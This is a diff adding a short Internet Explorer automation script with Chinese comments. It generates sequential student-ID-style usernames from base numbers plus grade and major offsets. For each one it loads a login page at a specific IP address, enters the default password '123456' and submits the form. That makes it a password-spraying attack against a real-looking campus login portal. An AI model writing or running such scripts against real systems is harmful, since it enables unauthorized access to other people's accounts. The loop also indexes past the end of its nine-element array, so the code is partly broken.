@@ -1,0 +1,46 @@
+Set ie = CreateObject("internetexplorer.application") // ie为对象变量 ，可以以此来操作打开的新ie页面
+UserVar jianCe=111817000 "注释"
+Dim a
+a = Array(111817000,111830000,111831000,111831000,111856000,111857000,111872000,111873000,111876000)
+//MessageBox a(1)
+For i=0 To 5
+    //这里的脚本可以循环6次,控制年级的位数
+    For j=0 To 9
+    	//这里的脚本可以循环9次，控制专业的代号
+    	num = a(j) + 1000000 * i
+    	For k=1 To 10
+    		//这里的脚本可以循环10次
+    		num = num+1
+    		//ie.visible=1 '设置是否可见 
+			ie.Navigate "http://59.67.0.220/" '设置IE对象默认指向的页面
+			Delay 1000
+			ie.document.getelementbyid("username").value = num
+			Delay 1000
+			ie.document.getelementbyid("password").value = "123456"
+			Delay 1000
+			Call ie.document.getelementbyid("submit").Click
+			Delay 1000
+		Next
+	Next
+Next
+
+
+
+    
+
+//当循环条件成立的时候，反复执行循环体
+
+
+//ie.menubar=0 '不显示IE对象菜单栏 
+//ie.AddressBar=0 '不显示IE对象地址栏
+//ie.ToolBar=0 '不显示IE对象工具栏
+//ie.StatusBar=0 '不显示IE对象状态栏
+//ie.FullScreen=1 '全屏化IE对象
+//ie.Width=800 '设置IE对象宽度
+//ie.Height=600 '设置IE对象高度
+//ie.Resizable=0 '设置IE对象大小是否可以被改动
+//ie.TheaterMode=1'最大化IE
+//最大化窗口
+//Call Plugin.Window.Max(ie)
+
+
